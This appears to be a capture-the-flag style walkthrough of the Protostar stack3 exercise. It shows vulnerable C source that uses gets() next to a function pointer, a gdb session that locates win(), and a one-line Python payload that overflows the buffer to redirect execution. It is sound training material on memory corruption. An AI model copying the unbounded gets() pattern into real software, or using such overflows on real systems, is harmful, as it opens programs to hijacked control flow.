## stack3

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3

### Source Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Analysis:
```bash
Reading symbols from /opt/protostar/bin/stack3...done.                                                 
(gdb) info functions                                                                                                        
All defined functions:                                                                                                      
                                                                                                                            
File stack3/stack3.c:                                                                                                       
int main(int, char **);                                                                                                     
void win(void);

Non-debugging symbols:
0x080482e0  _init
0x08048320  __gmon_start__
0x08048320  __gmon_start__@plt
0x08048330  gets
0x08048330  gets@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  printf
0x08048350  printf@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048480  __libc_csu_fini
0x08048490  __libc_csu_init
0x080484ea  __i686.get_pc_thunk.bx
0x080484f0  __do_global_ctors_aux
0x0804851c  _fini
(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave  
0x08048437 <win+19>:    ret    
End of assembler dump.
(gdb)
```
so address of win function is 0x08048424 we will send "A"\*64 +little endian(0x08048424)

### Exploit:
```bash
python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
```

![exploit](pictures/stack3.png)